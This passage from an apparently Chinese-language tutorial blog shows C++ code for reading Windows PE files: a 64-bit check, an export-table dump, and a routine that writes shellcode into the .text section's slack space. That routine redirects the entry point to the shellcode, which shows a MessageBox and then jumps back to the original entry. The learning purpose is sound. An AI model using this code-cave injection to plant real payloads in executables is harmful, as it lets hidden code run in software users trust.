class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="9-AddCodeToTextSec"><a href="#9-AddCodeToTextSec" class="headerlink" title="9 AddCodeToTextSec"></a>9 AddCodeToTextSec</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**************************************************************************	</span></span><br><span class="line"><span class="comment">AddCodeToTextSec：在代码（.text）空白区添加代码（修改PE文件），然后实现shellcode弹窗MessageBox</span></span><br><span class="line"><span class="comment">程序先执行call MessageBox（E8 0x75357870），执行完之后jmp OEP（E9 OEP）</span></span><br><span class="line"><span class="comment">call（E8）跳转的地址为(DWORD)((DWORD)codeBegin + 0xD)</span></span><br><span class="line"><span class="comment">但是pImageBuffer是动态生成的，下一次调用函数重新申请时值会改变，需要使用pOptionHeader-&gt;ImageBase才准确</span></span><br><span class="line"><span class="comment">***************************************************************************/</span>	</span><br><span class="line"><span class="function">VOID <span class="title">AddCodeToTextSec</span><span class="params">(LPVOID pFileBuffer,LPVOID pImageBuffer)</span></span>&#123;</span><br><span class="line">	LPVOID pNewFileBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD size = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span>(pFileBuffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pFileBuffer --&gt; 文件缓冲区失败&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(pImageBuffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pImageBuffer --&gt; 内存缓冲区失败&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pFileBuffer);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS)((BYTE *)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER)((BYTE *)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">	pSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE *)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span>(pSectionHeader-&gt;SizeOfRawData - pSectionHeader-&gt;Misc.VirtualSize &lt; ShellCodeLength)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;代码区空闲空间不足...&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pFileBuffer);</span><br><span class="line">		<span class="built_in">free</span>(pImageBuffer);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//BYTE* CODEBEGIN = (BYTE*)((DWORD)pDosHeader + pSectionHeader-&gt;VirtualAddress + pSectionHeader-&gt;Misc.VirtualSize)</span></span><br><span class="line">	BYTE *codeBegin = (BYTE *)((DWORD)pImageBuffer + pSectionHeader-&gt;VirtualAddress + pSectionHeader-&gt;Misc.VirtualSize); <span class="comment">// 计算放到哪里 </span></span><br><span class="line">	<span class="built_in">memcpy</span>(codeBegin, ShellCode, ShellCodeLength); </span><br><span class="line">	<span class="comment">//MessageBoxA_Addr = E8指令的下一条地址 + X</span></span><br><span class="line">	<span class="comment">//由于messageBoxAddr是虚拟内存中的值，故需要将callAddr转换成相应的可执行的虚拟地址</span></span><br><span class="line">	DWORD test = (DWORD)pImageBuffer;</span><br><span class="line">	DWORD Codee = (DWORD)codeBegin;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;pImageBuffer：%x\n&quot;</span>,test);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;codeBegin：%x\n&quot;</span>,Codee);</span><br><span class="line">	DWORD callAddr_X = MessageBoxA_Addr - ((DWORD)codeBegin + <span class="number">0xD</span> - (DWORD)pImageBuffer + pOptionHeader-&gt;ImageBase); <span class="comment">//从ImageBuffer 到 ImageBase 的过程</span></span><br><span class="line">	*(PDWORD)(codeBegin + <span class="number">0x09</span>) = callAddr_X;</span><br><span class="line">	cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;callAddr_X = &quot;</span> &lt;&lt; callAddr_X &lt;&lt; endl;</span><br><span class="line">	DWORD jmpAddr_Y = (pOptionHeader-&gt;ImageBase + pOptionHeader-&gt;AddressOfEntryPoint) - ((DWORD)codeBegin + ShellCodeLength - (DWORD)pImageBuffer + pOptionHeader-&gt;ImageBase);</span><br><span class="line">	<span class="comment">//DWORD jmpAddr = pOptionHeader-&gt;AddressOfEntryPoint - ((DWORD)codeBegin  - (DWORD)pImageBuffer + shellCodeLength);</span></span><br><span class="line">	cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;jmpAddr_Y = &quot;</span> &lt;&lt; jmpAddr_Y &lt;&lt; endl;</span><br><span class="line">	*(PDWORD)(codeBegin + <span class="number">0x0E</span>) = jmpAddr_Y;</span><br><span class="line"> 	<span class="comment">//OEP是一个偏移值</span></span><br><span class="line">	pOptionHeader-&gt;AddressOfEntryPoint = (DWORD)codeBegin - (DWORD)pImageBuffer ;</span><br><span class="line"> </span><br><span class="line">	size = <span class="built_in">CopyImageBufferToNewFileBuffer</span>(pImageBuffer, &amp;pNewFileBuffer);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Sizeofimage：%x\n&quot;</span>,size);</span><br><span class="line">	<span class="built_in">NewFileBufferToFile</span>(pNewFileBuffer, size, FilePath_Out);</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="A-Is-64BitOS"><a href="#A-Is-64BitOS" class="headerlink" title="A Is_64BitOS"></a>A Is_64BitOS</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">判断PE文件是否是64位，IA64（Intel）/x86_64（AMD）/ALPHA64</span></span><br><span class="line"><span class="comment">该出现PE时没出现，就可能是32位，但是检测到machine的数值，就能确定。</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> IMAGE_FILE_MACHINE_AMD64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64   0x8664 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="function">BOOL <span class="title">Is_64BitOS</span><span class="params">( IN LPSTR lpszFile)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LPVOID pTempBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	pTempBuffer = <span class="built_in">ReadPEFile</span>(lpszFile);</span><br><span class="line"> 	pDosHeader = (PIMAGE_DOS_HEADER)pTempBuffer;</span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS)((BYTE *)pTempBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;机器码为:&quot;</span> &lt;&lt; pNTHeader-&gt;FileHeader.Machine &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">if</span>(pNTHeader-&gt;Signature != IMAGE_NT_SIGNATURE)&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;PE文件版本可能为64位&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (pNTHeader-&gt;FileHeader.Machine == IMAGE_FILE_MACHINE_IA64 || pNTHeader-&gt;FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 || </span><br><span class="line">		pNTHeader-&gt;FileHeader.Machine == IMAGE_FILE_MACHINE_ALPHA64)&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;PE文件版本为64位&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;PE文件版本为32位&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="B-ReturnAllExport"><a href="#B-ReturnAllExport" class="headerlink" title="B ReturnAllExport"></a>B ReturnAllExport</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************	</span></span><br><span class="line"><span class="comment">输出导出表完整信息</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="function">VOID <span class="title">ReturnAllExport</span><span class="params">( IN LPVOID pFileBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  BOOL Is_64Bit = <span class="built_in">Is_64BitOS</span>(FILEPATH);</span><br><span class="line">  <span class="keyword">if</span>(Is_64Bit)&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS64 pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER64 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">    pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">    pNTHeader = (PIMAGE_NT_HEADERS64)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + sizeof(DWORD));</span></span><br><span class="line">    pOptionHeader = (PIMAGE_OPTIONAL_HEADER64)((BYTE *)pNTHeader + IMAGE_SIZEOF_FILE_HEADER + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)); </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    PIMAGE_OPTIONAL_HEADER64 pOptionHeader_1 = &amp;pNTHeader-&gt;OptionalHeader;</span></span><br><span class="line"><span class="comment">    printf(&quot;pOptionHeader：%x\n&quot;,(DWORD)pOptionHeader);</span></span><br><span class="line"><span class="comment">    printf(&quot;pOptionHeader_1：%x\n&quot;,(DWORD)pOptionHeader_1);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pNTHeader-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">	</span><br><span class="line">    pDataDirectory = pOptionHeader-&gt;DataDirectory;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;DataDirectory[0].VirtualAddress：&quot;</span> &lt;&lt; hex &lt;&lt; pNTHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">if</span>(pDataDirectory[<span class="number">0</span>].VirtualAddress == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      cout &lt;&lt; <span class="string">&quot;不存在导出表...&quot;</span> &lt;&lt; endl;</span><br><span class="line">      <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD ExportVirtualAddrRVA = pDataDirectory[<span class="number">0</span>].VirtualAddress;</span><br><span class="line">    <span class="comment">//ExportVirtualAddrRVA = 0x1060;</span></span><br><span class="line">    DWORD ExportVirtualAddrFOA = <span class="built_in">RVAToFOA</span>(ExportVirtualAddrRVA, pFileBuffer);</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;ExportVirtualAddrFOA = &quot;</span> &lt;&lt; ExportVirtualAddrFOA &lt;&lt; endl;</span><br><span class="line">	 </span><br><span class="line">    pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ExportVirtualAddrFOA + (DWORD)pFileBuffer);</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-----------IMAGE_EXPORT_DIRECTORY---------&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].VirtualAddress  = &quot;</span> &lt;&lt; ExportVirtualAddrRVA       &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].Size            = &quot;</span> &lt;&lt; pDataDirectory[<span class="number">0</span>].Size                &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Characteristics                   = &quot;</span> &lt;&lt; pExportDirectory-&gt;Characteristics      &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;TimeDateStamp                     = &quot;</span> &lt;&lt; pExportDirectory-&gt;TimeDateStamp      &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MajorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MajorVersion      &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MinorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MinorVersion      &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Name                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Name                   &lt;&lt; endl;</span><br><span class="line">    <span class="comment">//RVAToFOA(pExportDirectory-&gt;Name, pFileBuffer) 将指向Dll文件名的RVAToFOA</span></span><br><span class="line">    <span class="comment">//FOA + (DWORD)pFileBuffer即为Dll文件名的字符串</span></span><br><span class="line">    <span class="built_in">printf</span>(       <span class="string">&quot;Dll文件名             = %s\n&quot;</span>, <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;Name, pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Base                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Base                   &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfFunctions     = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfFunctions      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfNames         = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfNames          &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfFunctions    = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfFunctions     &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNames        = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNames         &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNameOrdinals = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNameOrdinals  &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-FunctionsDetail-------------------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-\t\t导出函数序号\t\tRVA\t\tFunctionName&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">		DWORD *AddrFunctions = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfFunctions, pFileBuffer));</span><br><span class="line">		DWORD *AddrName = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNames, pFileBuffer));</span><br><span class="line">		WORD  *AddrOrdinals = (WORD  *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNameOrdinals, pFileBuffer));</span><br><span class="line">		DWORD i, j;</span><br><span class="line">		<span class="comment">//导出函数的序号 = AddressOfNameOrdinals中的值 + Base</span></span><br><span class="line">		<span class="comment">//Base = 导出函数的序号最小值</span></span><br><span class="line">		<span class="comment">//AddressOfNameOrdinals中的值 = AddressOfFunctions下标</span></span><br><span class="line">		<span class="comment">//i为地址表下标，j为序号表的下标（AddrOrdinals[j]值为地址表下标）</span></span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; pExportDirectory-&gt;NumberOfFunctions; i++)&#123;</span><br><span class="line">			<span class="comment">//先检索函数地址表，因为所有的函数地址都在里面，包括用序号导出的和用函数名导出的。然后拿着某个函数的下标再到AddrOrdinals去检索，若匹配不到，说明该函数不</span></span><br><span class="line">			<span class="comment">//是以函数名导出的。</span></span><br><span class="line">			<span class="comment">//地址表中可能存在无用的值（就是为0的值）</span></span><br><span class="line">			<span class="keyword">if</span>(AddrFunctions[i] == <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; pExportDirectory-&gt;NumberOfNames; j++)&#123;</span><br><span class="line">				<span class="comment">//判断是否在序号表中</span></span><br><span class="line">				<span class="comment">//printf(&quot;函数名文件偏移：%x\n&quot;,RVAToFOA(AddrName[j], pFileBuffer));该地址为字符串起始地址</span></span><br><span class="line">				<span class="keyword">if</span>(AddrOrdinals[j] == i)&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;-\t\t%04x\t\t%08x\t%s\n&quot;</span>, pExportDirectory-&gt;Base + i, AddrFunctions[i], <span class="built_in">RVAToFOA</span>(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(j != pExportDirectory-&gt;NumberOfNames)&#123;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;-\t\t%04x\t\t%08x\t%s\n&quot;</span>, pExportDirectory-&gt;Base + i, AddrFunctions[i],<span class="string">&quot;------NONAME函数------&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		</span><br><span class="line">		PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_NT_HEADERS32 pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">		pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">		pNTHeader = (PIMAGE_NT_HEADERS32)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">		pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">		pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((BYTE *)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">		<span class="comment">//pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((BYTE *)pNTHeader + IMAGE_SIZEOF_FILE_HEADER + sizeof(DWORD)); </span></span><br><span class="line">		<span class="comment">//pOptionHeader = &amp;pNTHeader-&gt;OptionalHeader;</span></span><br><span class="line">		pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pNTHeader-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">	</span><br><span class="line">		pDataDirectory = pOptionHeader-&gt;DataDirectory;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;DataDirectory[0].VirtualAddress：&quot;</span> &lt;&lt; hex &lt;&lt; pNTHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">if</span>(pDataDirectory[<span class="number">0</span>].VirtualAddress == <span class="number">0</span>)&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;不存在导出表...&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">return</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">		DWORD ExportVirtualAddrRVA = pDataDirectory[<span class="number">0</span>].VirtualAddress;</span><br><span class="line">		<span class="comment">//ExportVirtualAddrRVA = 0x1060;</span></span><br><span class="line">		DWORD ExportVirtualAddrFOA = <span class="built_in">RVAToFOA</span>(ExportVirtualAddrRVA, pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;ExportVirtualAddrFOA = &quot;</span> &lt;&lt; ExportVirtualAddrFOA &lt;&lt; endl;</span><br><span class="line">	 </span><br><span class="line">		pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ExportVirtualAddrFOA + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-----------IMAGE_EXPORT_DIRECTORY---------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].VirtualAddress  = &quot;</span> &lt;&lt; ExportVirtualAddrRVA       &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].Size            = &quot;</span> &lt;&lt; pDataDirectory[<span class="number">0</span>].Size                &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Characteristics                   = &quot;</span> &lt;&lt; pExportDirectory-&gt;Characteristics      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;TimeDateStamp                     = &quot;</span> &lt;&lt; pExportDirectory-&gt;TimeDateStamp      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MajorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MajorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MinorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MinorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Name                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Name                   &lt;&lt; endl;</span><br><span class="line">		<span class="comment">//RVAToFOA(pExportDirectory-&gt;Name, pFileBuffer) 将指向Dll文件名的RVAToFOA</span></span><br><span class="line">		<span class="comment">//FOA + (DWORD)pFileBuffer即为Dll文件名的字符串</span></span><br><span class="line">		<span class="comment">//printf(&quot;%s&quot;,FOA + (DWORD)pFileBuffer) 等给于PDWORD TEST = (PDWORD)(FOA+ (DWORD)pFileBuffer);printf(&quot;%s&quot;,TEST) </span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		PDWORD TEST = (PDWORD)((RVAToFOA(pExportDirectory-&gt;Name, pFileBuffer)+ (DWORD)pFileBuffer));</span></span><br><span class="line"><span class="comment">		printf(&quot;%s\n&quot;,TEST) ;</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="built_in">printf</span>(       <span class="string">&quot;Dll文件名             = %s\n&quot;</span>, <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;Name, pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Base                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Base                   &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfFunctions     = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfFunctions      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfNames         = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfNames          &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfFunctions    = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfFunctions     &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNames        = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNames         &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNameOrdinals = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNameOrdinals  &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-FunctionsDetail-------------------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-\t\t导出函数序号\t\tRVA\t\tFunctionName&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">		DWORD *AddrFunctions = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfFunctions, pFileBuffer));</span><br><span class="line">		DWORD *AddrName = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNames, pFileBuffer));</span><br><span class="line">		WORD  *AddrOrdinals = (WORD  *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNameOrdinals, pFileBuffer));</span><br><span class="line">		DWORD i, j;</span><br><span class="line">		<span class="comment">//导出函数的序号 = AddressOfNameOrdinals中的值 + Base</span></span><br><span class="line">		<span class="comment">//Base = 导出函数的序号最小值</span></span><br><span class="line">		<span class="comment">//AddressOfNameOrdinals中的值 = AddressOfFunctions下标</span></span><br><span class="line">		<span class="comment">//i为地址表下标，j为序号表的下标（AddrOrdinals[j]值为地址表下标）</span></span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; pExportDirectory-&gt;NumberOfFunctions; i++)&#123;</span><br><span class="line">			<span class="comment">//地址表中可能存在无用的值（就是为0的值）</span></span><br><span class="line">			<span class="keyword">if</span>(AddrFunctions[i] == <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; pExportDirectory-&gt;NumberOfNames; j++)&#123;</span><br><span class="line">				<span class="comment">//判断是否在序号表中</span></span><br><span class="line">				<span class="comment">//printf(&quot;函数名文件偏移：%x\n&quot;,RVAToFOA(AddrName[j], pFileBuffer));</span></span><br><span class="line">				<span class="keyword">if</span>(AddrOrdinals[j] == i)&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;-\t\t%04x\t\t%08x\t%s\n&quot;</span>, pExportDirectory-&gt;Base + i, AddrFunctions[i], <span class="built_in">RVAToFOA</span>(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(j != pExportDirectory-&gt;NumberOfNames)&#123;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;-\t\t%04x\t\t%08x\t%s\n&quot;</span>, pExportDirectory-&gt;Base + i, AddrFunctions[i],<span class="string">&quot;------NONAME函数------&quot;</span>);</span><br><span class="line">			&#125;</span><br><span 